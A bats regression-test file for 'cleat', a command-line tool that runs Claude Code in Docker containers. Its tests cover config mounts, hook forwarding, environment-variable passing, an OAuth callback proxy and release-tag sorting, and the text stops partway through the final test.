#!/usr/bin/env bats
# ─────────────────────────────────────────────────────────────────────────────
# REGRESSION REGISTRY
#
# One canonical test per bug that ever shipped. Every test is named by the
# version that fixed it plus a short description. Each test is mutation-tested:
# reverting the fix in bin/cleat MUST cause the test to fail.
#
# Rules:
#   1. Every entry references the version that introduced AND fixed the bug.
#   2. Every test reproduces the exact input conditions that triggered it.
#   3. Every test asserts the fix, not just that the code runs.
#   4. If the bug cannot be caught at unit level, the test lives here as a
#      stub with a `skip` pointing to the smoke/integration file that covers it.
#   5. Never delete a regression test. Bugs come back.
# ─────────────────────────────────────────────────────────────────────────────

load "../setup"

setup() {
  _common_setup
  use_docker_stub
  source_cli

  # Neutralize side effects so we only test the regression behavior
  _host_clip_cmd() { echo ""; }
  check_for_update() { true; }
  check_drift() { true; }
  _resolve_config_drift() { true; }
  show_first_run_tip() { true; }

  # Use isolated config dir so tests don't touch real host
  CLEAT_CONFIG_DIR="$TEST_TEMP/cleat-config"
  CLEAT_GLOBAL_CONFIG="$CLEAT_CONFIG_DIR/config"
  CLEAT_GLOBAL_ENV="$CLEAT_CONFIG_DIR/env"
  _first_run_tip_file="$CLEAT_CONFIG_DIR/.tip-shown"
  mkdir -p "$CLEAT_CONFIG_DIR"
}

teardown() {
  rm -rf $CLEAT_RUN_DIR/cleat-project-*/settings 2>/dev/null || true
  rm -rf $CLEAT_RUN_DIR/cleat-project-*/hooks 2>/dev/null || true
  rm -rf $CLEAT_RUN_DIR/cleat-project-*/clip 2>/dev/null || true
  _common_teardown
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.13.0: the startup summary's "Project:" row always claimed the project was
# mounted at "→ /workspace". That's a lie under the docker cap: that cap mounts
# the project at its HOST path and sets the container workdir there (so $(pwd)
# and `docker run -v $(pwd)` resolve on the host daemon, see the docker-cap
# mount block). The row now branches: host path "(same path, sandboxed)" under
# the docker cap, "→ /workspace" otherwise.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.13.0: summary Project row is truthful under the docker cap" {
  ACTIVE_CAPS=(docker)
  run _print_summary_block "cleat-x-12345678" "$HOME/proj"
  assert_output --partial "(same path, sandboxed)"
  refute_output --partial " /workspace"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.13.0: Claude greeted users with "Configuration Error / The configuration
# file at /home/coder/.claude.json contains invalid JSON ... Unexpected EOF" at
# startup, intermittently. Root cause: Cleat mounted the single host
# ~/.claude.json WHOLE and READ-WRITE into every container. Since every
# container runs at CWD /workspace, parallel/interrupted Claude writes to the
# same shared host file truncated it, and all projects also shared
# projects["/workspace"] (trust/MCP/allowedTools bled across unrelated repos).
#
# Fix: build a per-project, persistent ~/.claude.json (host global keys as base
# + this project's own /workspace block) and mount THAT. The container never
# writes the host file, so the corruption race and the bleed are gone by
# construction. The regression guard: the container's .claude.json bind SOURCE
# must be the per-project store, never the shared host file.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.13.0: container mounts an isolated .claude.json, not the shared host file" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  echo '{"oauthAccount":{"emailAddress":"a@b.com"}}' > "${HOME}/.claude.json"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"

  # A .claude.json is mounted onto the canonical container path…
  run assert_docker_run_has "$cname" ":/home/coder/.claude.json"
  assert_success
  # …from the per-project store, NOT the shared host file (the bug).
  run assert_docker_run_has "$cname" "cleat/projects/"
  assert_success
  run assert_docker_run_lacks "$cname" "${HOME}/.claude.json:/home/coder/.claude.json"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.5.1: cmd_claude did not set _RESOLVED_PROJECT, so hook bridge
# couldn't find project-level hooks. Silent failure in production, invisible
# to tests because `set -u` was stripped.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.5.1: cmd_claude sets _RESOLVED_PROJECT" {
  mkdir -p "$TEST_TEMP/project/.claude"
  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"x"}]}]}}' \
    > "$TEST_TEMP/project/.claude/settings.json"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  # Container must also "exist" so cmd_claude's drift-recreate fallback
  # doesn't run cmd_run (which would mask a missing _RESOLVED_PROJECT assignment).
  mock_docker_ps_a "$cname"
  exec_claude() { return 0; }

  _RESOLVED_PROJECT=""
  cmd_claude "$TEST_TEMP/project"

  [[ "$_RESOLVED_PROJECT" == "$TEST_TEMP/project" ]] || {
    echo "REGRESSION: _RESOLVED_PROJECT='$_RESOLVED_PROJECT' expected '$TEST_TEMP/project'"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.5.1: Hook settings overlay stripped all hooks instead of replacing
# command with forwarder. Project hooks never fired.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.5.1: hook overlay replaces command with forwarder (not strip)" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mkdir -p "${HOME}/.claude"
  cat > "${HOME}/.claude/settings.json" << 'EOF'
{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"my-host-hook"}]}]}}
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  local overlay="$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  [[ -f "$overlay" ]] || { echo "REGRESSION: overlay not created"; return 1; }

  # Must contain forwarder command, not be empty and not contain original
  run jq -r '.hooks.Stop[0].hooks[0].command' "$overlay"
  assert_output "cat >> /var/log/cleat/events.jsonl"

  : > "${HOME}/.claude/settings.json" 2>/dev/null || true
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.0: Hook bridge replayed old events on every start. Any events left
# in /var/log/cleat/events.jsonl from a prior session re-executed on restart.
# Fix: _hook_bridge_watcher reads the file's current byte size at startup and
# only tails bytes that appear AFTER that offset.
#
# This test verifies the fix structurally (the function body must initialize
# byte_offset from wc -c BEFORE the tail loop). A behavioral test requires
# launching a real subshell of the watcher and observing subprocess spawns,
# which is too fragile for unit testing. End-to-end coverage is in the
# integration suite.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.0: hook bridge skips pre-existing events at startup" {
  local body
  body="$(declare -f _hook_bridge_watcher)"
  [[ -n "$body" ]] || { echo "REGRESSION: _hook_bridge_watcher missing"; return 1; }

  # The function must initialize byte_offset with wc -c BEFORE entering its
  # tail loop. Anything else means we'd start at 0 and replay old events.
  echo "$body" | grep -qE 'byte_offset=.*wc -c' || {
    echo "REGRESSION: _hook_bridge_watcher must initialize byte_offset from wc -c"
    return 1
  }

  # Verify wc -c appears BEFORE the `while true` loop
  local before_loop
  before_loop="${body%%while true*}"
  echo "$before_loop" | grep -qE 'byte_offset=' || {
    echo "REGRESSION: byte_offset must be initialized before the tail loop"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.0: Project overlay created .claude/ as root on host when directory
# didn't exist, because docker created the bind mount source.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.0: skip project overlay when .claude/ missing on host" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  # .claude/ intentionally missing

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  # Must NOT mount project settings overlay at /workspace/.claude/settings.json
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
  assert_success
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.local.json"
  assert_success

  [[ ! -d "$TEST_TEMP/project/.claude" ]] || {
    echo "REGRESSION: .claude/ created on host by cleat"
    return 1
  }

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.1: Browser bridge pre-initialized last_ts with the current file's
# mtime to skip stale URLs. Same-second writes had identical mtime and were
# silently dropped. Fix: delete stale file entirely at watcher startup, then
# track the empty-state as last_ts="". A new write has cur_ts != "" which
# triggers detection regardless of same-second collision.
#
# This test checks the function body structurally: the first operation in
# _browser_watcher after local declarations must be `rm -f "$bridge_file"`
# (not a pre-init of last_ts from the stale file's stat output).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.1: browser bridge removes stale file at startup" {
  # Behavioral: a bridge file left by a PRIOR session must be swept before the
  # poll loop can claim it, so a stale URL is never opened on the host. The
  # sweep now lives in a shared helper, so grepping the watcher body for the rm
  # proved nothing about whether it still happens.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf '%s' "https://example.com/stale" > "$dir/.browser-open"
  touch -t 202001010000 "$dir/.browser-open"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 2
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ ! -e "$dir/.browser-open" ] || {
    echo "REGRESSION: a stale .browser-open survived watcher startup"; return 1; }
  [ ! -f "$TEST_TEMP/opened.log" ] || {
    echo "REGRESSION: a stale URL from a prior session was opened on the host"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.2: docker run/start failures were shown as "Container failed to
# start" with no reason. Docker's stderr was swallowed by 2>&1 redirection.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.2: docker run failure surfaces docker stderr" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  export DOCKER_EXIT_CODE=125
  export DOCKER_STDERR="Error response from daemon: Conflict. The container name \"/test\" is already in use"

  run cmd_run "$TEST_TEMP/project"
  assert_failure

  # The exact docker stderr message must appear in the output
  assert_output --partial "Conflict"
  assert_output --partial "already in use"

  unset DOCKER_EXIT_CODE DOCKER_STDERR
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.2: Settings overlay directory was not cleaned on cmd_run after rm,
# causing stale overlays from a previous container to contaminate the new one.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.2: cmd_run wipes stale settings overlay dir" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  # Seed stale state from a previous container
  local overlay_dir="$CLEAT_RUN_DIR/${cname}/settings"
  mkdir -p "$overlay_dir"
  echo '{"stale":true}' > "$overlay_dir/settings.json"
  echo '{"stale":true}' > "$overlay_dir/stale-file-from-prior-run.json"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The stale file from the prior run must be gone
  [[ ! -f "$overlay_dir/stale-file-from-prior-run.json" ]] || {
    echo "REGRESSION: stale overlay file from prior run was not wiped"
    return 1
  }

  # The current settings.json must be the new one, not the stale marker
  run jq -e '.stale // empty' "$overlay_dir/settings.json"
  assert_failure  # no .stale field in new file

  rm -rf "$overlay_dir" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.2: Quoted tilde in summary block showed '~' literally instead of
# collapsing $HOME to ~. Fix used intermediate variable to avoid word splitting.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.2: summary block shows ~ without quotes for home-relative path" {
  local real_home="$HOME"
  HOME="$TEST_TEMP/fakehome"
  mkdir -p "$HOME/Workspaces/my-proj"

  ACTIVE_CAPS=()
  run _print_summary_block "cleat-test-12345678" "$HOME/Workspaces/my-proj"

  # Path must collapse to ~/Workspaces/my-proj, not '~'/Workspaces or $HOME/...
  assert_output --partial "~/Workspaces/my-proj"
  refute_output --partial "'~'"
  refute_output --partial "$HOME/Workspaces"

  HOME="$real_home"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: exec_claude called docker exec with only HOME and PATH. Env vars
# resolved from .cleat.env were passed at docker run but not at exec time.
# Containers restarted via start/resume did not see updated env values.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: exec_claude passes resolved env args to docker exec" {
  _RESOLVED_ENV_ARGS=(-e "DATABASE_URL=postgres://localhost/mydb" -e "API_KEY=secret")
  run exec_claude "cleat-test-ctr" --dangerously-skip-permissions
  run assert_docker_exec_has "DATABASE_URL=postgres://localhost/mydb"
  assert_success
  run assert_docker_exec_has "API_KEY=secret"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_shell didn't call resolve_env_args and didn't pass env to
# docker exec, so `cleat shell && echo $DATABASE_URL` showed empty.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_shell passes .cleat.env vars to docker exec" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  cat > "$TEST_TEMP/project/.cleat.env" << 'EOF'
DATABASE_URL=postgres://localhost/mydb
API_KEY=sk-test-123
EOF
  cat > "$TEST_TEMP/project/.cleat" << 'EOF'
[caps]
env
EOF

  run cmd_shell "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "DATABASE_URL=postgres://localhost/mydb"
  assert_success
  run assert_docker_exec_has "API_KEY=sk-test-123"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_shell used only `-e HOME=/home/coder` and did not pass PATH.
# ~/.local/bin was not on the container shell's PATH.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_shell sets PATH with /home/coder/.local/bin" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  run cmd_shell "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "PATH="
  assert_success
  run assert_docker_exec_has "/home/coder/.local/bin"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_login didn't call resolve_env_args. Custom API endpoints or
# credentials in .cleat.env weren't available during authentication.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_login passes .cleat.env vars to docker exec" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  cat > "$TEST_TEMP/project/.cleat.env" << 'EOF'
ANTHROPIC_BASE_URL=https://custom.api.example.com
EOF
  cat > "$TEST_TEMP/project/.cleat" << 'EOF'
[caps]
env
EOF

  run cmd_login "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "ANTHROPIC_BASE_URL=https://custom.api.example.com"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: _parse_env_file used `while read -r line` without `|| [[ -n $line ]]`,
# skipping the last line of a file with no trailing newline.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: _parse_env_file reads last line without trailing newline" {
  printf 'FIRST=one\nLAST=two' > "$TEST_TEMP/envfile"
  run _parse_env_file "$TEST_TEMP/envfile"
  assert_success
  assert_line --index 0 "FIRST=one"
  assert_line --index 1 "LAST=two"
  [[ "${#lines[@]}" -eq 2 ]] || {
    echo "REGRESSION: expected 2 lines, got ${#lines[@]}"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: Env summary line was omitted when a .cleat.env existed but had
# only comments (count=0). Users couldn't tell if the file was being read.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: env summary shows 0 count when file has only comments" {
  ACTIVE_CAPS=(env)
  mkdir -p "$TEST_TEMP/project"
  cat > "$TEST_TEMP/project/.cleat.env" << 'EOF'
# just comments
# another comment
EOF
  run _env_summary_inline "$TEST_TEMP/project"
  assert_output --partial "Env:"
  assert_output --partial "0 from .cleat.env"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.4: OAuth callback proxy used socat default TCP (127.0.0.1) but
# Node.js binds localhost to ::1. Every callback was Connection Refused.
# Fix: try TCP6 first, fall back to TCP.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.4: the callback proxy forwards TCP6 first with ignoreeof" {
  # Was four separate `declare -f` source greps, every one of which passed
  # while the forward was completely broken. This asserts on the argv socat
  # actually receives instead.
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/socat" <<EOF
#!/usr/bin/env bash
printf '%s\n' "\$@" > "$TEST_TEMP/socat.argv"
exit 0
EOF
  chmod +x "$TEST_TEMP/bin/socat"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45001 mybox "$TEST_TEMP/plog"
  run cat "$TEST_TEMP/socat.argv"
  assert_output --partial "TCP-LISTEN:45001"
  assert_output --partial "bind=127.0.0.1"
  # Inside a SYSTEM: parameter both ',' and ':' are socat separators, so the
  # exact escaped words are what must reach socat, not merely the substrings.
  assert_output --partial 'SYSTEM:docker exec -i mybox socat -\,ignoreeof TCP6\:localhost\:45001'
  assert_output --partial '|| docker exec -i mybox socat -\,ignoreeof TCP\:localhost\:45001'

  local argv; argv="$(cat "$TEST_TEMP/socat.argv")"
  local before="${argv%%TCP6*}"
  local t6=${#before}
  local t4
  t4=$(printf '%s' "$argv" | grep -bo 'TCP\\*:localhost' | grep -v TCP6 | head -1 | cut -d: -f1)
  [ -n "$t4" ] || { echo "REGRESSION: IPv4 fallback missing"; return 1; }
  [ "$t6" -lt "$t4" ] || { echo "REGRESSION: TCP6 must precede the TCP fallback"; return 1; }
}

@test "regression v0.6.4: the python proxy rewrites keep-alive to close before forwarding" {
  # Behavioral: run the real python backend (socat masked off PATH) with a stub
  # container that captures what it is handed, send a keep-alive request, and
  # assert the forwarded request carries Connection: close.
  command -v python3 >/dev/null 2>&1 || skip "python3 not available"
  mkdir -p "$TEST_TEMP/nosocat4"
  local b
  for b in bash date cat sleep python3; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat4/$b"; done
  cat > "$TEST_TEMP/nosocat4/docker" <<EOF
#!/usr/bin/env bash
cat > "$TEST_TEMP/forwarded.req"
printf 'HTTP/1.1 302 Found\r\nLocation: /\r\nContent-Length: 0\r\n\r\n'
EOF
  chmod +x "$TEST_TEMP/nosocat4/docker"
  PATH="$TEST_TEMP/nosocat4" _auth_callback_proxy 45005 mybox "$TEST_TEMP/plog5" &
  local ppid=$!
  local i connected=0
  for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
    if exec 9<>/dev/tcp/127.0.0.1/45005 2>/dev/null; then connected=1; break; fi
    sleep 0.3
  done
  [ "$connected" = 1 ] || { kill "$ppid" 2>/dev/null; echo "python proxy never bound"; return 1; }
  printf 'GET /callback?code=x HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n' >&9
  _portable_timeout 5 cat <&9 >/dev/null 2>&1 || true
  exec 9<&- 2>/dev/null || true
  wait "$ppid" 2>/dev/null || true
  run cat "$TEST_TEMP/forwarded.req"
  assert_output --partial "Connection: close"
  refute_output --partial "keep-alive"
}

@test "regression v0.6.4: the socat proxy retries a busy bind" {
  # A bind refused with exit 1 must be retried, not abandoned.
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/socat" <<EOF
#!/usr/bin/env bash
n=\$(cat "$TEST_TEMP/attempts" 2>/dev/null || echo 0); n=\$((n + 1)); echo "\$n" > "$TEST_TEMP/attempts"
[ "\$n" -ge 2 ] && exit 0
exit 1
EOF
  chmod +x "$TEST_TEMP/bin/socat"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45004 mybox "$TEST_TEMP/plog4"
  run cat "$TEST_TEMP/attempts"
  assert_output "2"
  run cat "$TEST_TEMP/plog4"
  assert_output --partial "bind failed, retrying"
}

@test "regression vnext: the callback proxy actually forwards, it is not an EXEC no-op" {
  # socat's EXEC address strips the quotes and splits on whitespace without a
  # shell, so `EXEC:sh -c '...'` ran `docker` with no arguments and every
  # callback came back EMPTY on any host that HAS socat. Hosts without it took
  # the python branch, which works, which is why this hid. Drive a real
  # loopback request through the real socat with a stub docker standing in for
  # the container.
  command -v socat >/dev/null 2>&1 || skip "socat is not installed on this host"
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/docker" <<'DOCKEOF'
#!/usr/bin/env bash
# Answer ONLY the exact exec line the forward must produce, and REFUSE the
# IPv6 leg so the `||` IPv4 fallback has to survive socat's parsing as well.
# A stub that answered any argv passed against a command socat had truncated
# at the first unescaped colon (the box received `socat -,ignoreeof TCP6` and
# nothing after it). That was a real false green.
[ "$1" = exec ] && [ "$2" = -i ] && [ "$3" = mybox ] && [ "$4" = socat ] && [ "$5" = "-,ignoreeof" ] || exit 1
case "$6" in
  TCP6:localhost:45002) exit 1 ;;
  TCP:localhost:45002)  printf 'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK' ;;
  *) exit 1 ;;
esac
DOCKEOF
  chmod +x "$TEST_TEMP/bin/docker"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45002 mybox "$TEST_TEMP/plog2" &
  local ppid=$!
  local i connected=0
  for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
    if exec 9<>/dev/tcp/127.0.0.1/45002 2>/dev/null; then connected=1; break; fi
    sleep 0.3
  done
  [ "$connected" = 1 ] || { kill "$ppid" 2>/dev/null; echo "proxy never bound the port"; return 1; }
  printf 'GET /callback?code=x HTTP/1.0\r\n\r\n' >&9
  local reply; reply="$(_portable_timeout 3 cat <&9)"
  exec 9<&- 2>/dev/null || true
  kill "$ppid" 2>/dev/null || true; wait "$ppid" 2>/dev/null || true
  case "$reply" in
    *OK*) : ;;
    *) echo "REGRESSION: the forward returned nothing usable: '$reply'"; return 1 ;;
  esac
}


# ─────────────────────────────────────────────────────────────────────────────
# v0.6.5: cmd_run wrote empty {} overlay and bind-mounted to
# /workspace/.claude/settings.json for files that didn't exist on host.
# Fails on macOS Docker Desktop virtiofs ("outside of rootfs" error).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.5: cmd_run skips overlay mount for missing host files" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project/.claude"
  # .claude/ exists but neither settings.json nor settings.local.json

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
  assert_success
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.local.json"
  assert_success

  # And no empty overlay file should have been created (the broken path wrote `{}`)
  [[ ! -f "$CLEAT_RUN_DIR/${cname}/settings/project-settings.json" ]] || {
    echo "REGRESSION: empty overlay file created for non-existent host file"
    return 1
  }
  [[ ! -f "$CLEAT_RUN_DIR/${cname}/settings/project-settings.local.json" ]] || {
    echo "REGRESSION: empty overlay file created for non-existent host file"
    return 1
  }

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.5: docker run failure could leave a partial container that collided
# with the next attempt's name. Fix: docker rm -f on failure.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.5: cmd_run cleans up partial container on docker run failure" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  export DOCKER_EXIT_CODE=125
  export DOCKER_STDERR="OCI runtime create failed"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_failure

  # A docker rm -f call must have been issued for the failed container
  grep -qE "^docker rm -f $cname" "$DOCKER_CALLS" || {
    echo "REGRESSION: cmd_run did not clean up partial container on failure"
    echo "Docker calls:"
    cat "$DOCKER_CALLS"
    return 1
  }

  unset DOCKER_EXIT_CODE DOCKER_STDERR
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: --env, --env-file, --cap global flags only applied to start/run/
# resume/claude. Users passing `cleat --env X shell` got no env.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_shell resolves env args (not just hardcoded HOME/PATH)" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  # Check that resolve_env_args is called inside cmd_shell by looking at the function body
  local body
  body="$(declare -f cmd_shell)"
  echo "$body" | grep -q 'resolve_env_args' || {
    echo "REGRESSION: cmd_shell must call resolve_env_args"
    return 1
  }
  echo "$body" | grep -q '_RESOLVED_ENV_ARGS' || {
    echo "REGRESSION: cmd_shell must pass _RESOLVED_ENV_ARGS to docker exec"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_login had the same bug as cmd_shell.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_login resolves env args" {
  local body
  body="$(declare -f cmd_login)"
  echo "$body" | grep -q 'resolve_env_args' || {
    echo "REGRESSION: cmd_login must call resolve_env_args"
    return 1
  }
  echo "$body" | grep -q '_RESOLVED_ENV_ARGS' || {
    echo "REGRESSION: cmd_login must pass _RESOLVED_ENV_ARGS to docker exec"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# Stale-mount detection: after macOS reboot /tmp is cleared and SSH agent
# socket path rotates. Stopped containers have old bind mounts baked in and
# cannot start. cmd_start must detect this and recreate silently.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression stale-mount: cmd_start recreates container when overlay dir missing" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  # Simulate: container exists (stopped), overlay dir is missing (stale after reboot)
  mock_docker_ps_a "$cname"
  is_running() { return 1; }
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" 2>/dev/null || true

  run cmd_start "$TEST_TEMP/project"

  # cmd_start should have removed the stale container and called cmd_run to recreate
  grep -qE "^docker rm -f $cname" "$DOCKER_CALLS" || {
    echo "REGRESSION: stale container not removed"
    cat "$DOCKER_CALLS"
    return 1
  }
  grep -qE "^docker run " "$DOCKER_CALLS" || {
    echo "REGRESSION: container not recreated after stale detection"
    cat "$DOCKER_CALLS"
    return 1
  }

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# Update cache corruption: check_for_update read a non-numeric last_check
# from a corrupted cache file and passed it directly to an arithmetic
# expression. Under set -u, bash treats `(( garbage ... ))` as an unbound
# variable reference and aborts the CLI. Discovered during strict-mode
# hardening in the test suite (April 2026). Fix: validate last_check is
# a non-negative integer before the arithmetic.
# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# latest_remote_tag: must numerically sort semver versions.
# Lexical sort would break v0.10.0 < v0.9.0 → "0.10.0" < "0.9.0" as strings.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: latest_remote_tag sorts 0.10.0 > 0.9.0 numerically" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  # Git stub that returns unsorted tags including double-digit minor versions
  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
if [ "$1" = "-C" ] && [ "$3" = "ls-remote" ]; then
  cat << 'TAGS'
abc	refs/tags/v0.6.5
def	refs/tags/v0.9.0
abc	refs/tags/v0.10.0
xyz	refs/tags/v0.9.1
111	refs/tags/v0.10.1
TAGS
fi
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  run latest_remote_tag
  assert_success
  assert_output "0.10.1"
}

@test "regression: latest_remote_tag filters non-semver tags" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
cat << 'TAGS'
abc	refs/tags/v0.6.5
abc	refs/tags/v2.0.0-beta
abc	refs/tags/v1.0.0-rc1
abc	refs/tags/v0.7.0
abc	refs/tags/nightly
abc	refs/tags/v0.8.0-alpha.1
TAGS
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  run latest_remote_tag
  assert_success
  # Only v0.6.5 and v0.7.0 are strict X.Y.Z, v0.7.0 wins
  assert_output "0.7.0"
}

@test "regression: latest_remote_tag empty output when no tags match" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
echo ""
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  # Contract: output must be empty when no semver tags exist. Exit code is
  # non-zero under pipefail (grep non-match), callers handle this via `|| true`.
